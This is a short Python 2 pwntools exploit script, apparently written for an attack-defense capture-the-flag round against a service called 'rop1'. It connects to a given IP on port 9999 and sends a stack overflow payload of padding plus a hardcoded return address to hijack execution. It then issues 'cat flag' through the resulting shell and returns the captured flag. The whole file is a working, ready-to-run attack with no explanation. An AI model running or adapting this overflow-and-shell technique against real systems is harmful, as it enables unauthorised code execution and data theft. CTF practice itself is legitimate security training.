from pwn import *
import time
import sys
def main(ip):
    try:
        ######################################
        ###here is you attack script start####
        ######################################

        port = 9999
        r = remote(ip, port,timeout=3)
        # context.log_level="debug"
        # r = process("./rop1")
        payload = "A"*(0x48+0x4) + p32(0x080485e3)
        r.recvuntil("Hello, World\n")

        r.sendline(payload)
        time.sleep(0.1)

        # r.interactive()
        # change interactive to cat flag
        r.sendline("cat flag")
        flag = r.recvuntil("}")
        r.close()


        if flag:
            return {'getflag_status': "getflag success", 'flag': flag}

        ######################################
        ###here is you attack script stop####
        ######################################

        else:
            return {'getflag_status': "getflag failed", 'flag': 'error'}
    except (KeyboardInterrupt, SystemExit):
        raise
    except Exception, e:
        return {'getflag_status':'getflag failed:' + str(e), 'flag':'error'}

if __name__ == '__main__':
    ip = sys.argv[1]
    print(main(ip))
